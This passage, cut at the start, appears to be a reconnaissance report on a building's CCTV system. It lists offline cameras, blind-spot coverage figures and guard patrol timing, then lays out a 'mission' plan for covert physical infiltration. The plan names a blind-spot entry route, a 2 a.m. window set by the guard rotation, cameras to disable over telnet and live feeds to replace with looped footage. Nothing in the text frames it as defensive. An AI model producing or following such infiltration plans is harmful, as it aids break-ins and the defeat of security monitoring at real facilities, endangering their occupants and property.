  └─ Possible tampering

- CAM-017 (Perimeter): OFFLINE since Dec 20 (2 days)
  └─ Last motion: Dec 20, 02:14 (unusual time)
  └─ Pattern: Same method as CAM-023

- CAM-006 (Lab 201): Motion spike on Dec 21, 23:00-02:00
  └─ 89 events in 3 hours (normal: 2-3 events)
  └─ After-hours activity = SUSPICIOUS

## COVERAGE MAP

Building footprint: 100m x 100m
Grid resolution: 1m x 1m (10,000 cells)

Coverage analysis:
- Full coverage: 6,234 cells (62.3%)
- Partial coverage: 2,156 cells (21.6%)
- No coverage: 1,610 cells (16.1%) ← BLIND SPOTS

Critical areas coverage:
- Entrance: 95% ✓
- Corridors: 78% ⚠️
- Labs: 68% ⚠️
- Server room: 85% ✓
- Director floor: 45% ⚠️ (CRITICAL GAP)
- Perimeter: 58% ⚠️ (2 cameras offline)

## MISSION OBJECTIVE

**PRIMARY:** Identify blind spots for physical infiltration
**SECONDARY:** Find vulnerable cameras for stream manipulation
**TERTIARY:** Map security guard patrol routes

**FINDINGS:**
✅ Blind spot route identified: Loading Dock → Stairwell B
✅ Vulnerable cameras: 18 exploitable (75% success rate)
✅ Guard patrol: Predictable (every 2 hours, 15 min route)

**RECOMMENDATION FOR INFILTRATION:**
- Time: 02:00-02:15 (guard rotation)
- Entry: Loading Dock (blind spot)
- Route: Stairwell B (no cameras)
- Exit: Same route or Ventilation Access (roof)
- Cameras to disable: CAM-008 (telnet), CAM-010 (if needed)
- Stream replacement: CAM-006, CAM-008 (loop 30 min footage)

**RISK LEVEL:** Medium (if executed during optimal window)
**DETECTION PROBABILITY:** 8% (based on current security posture)
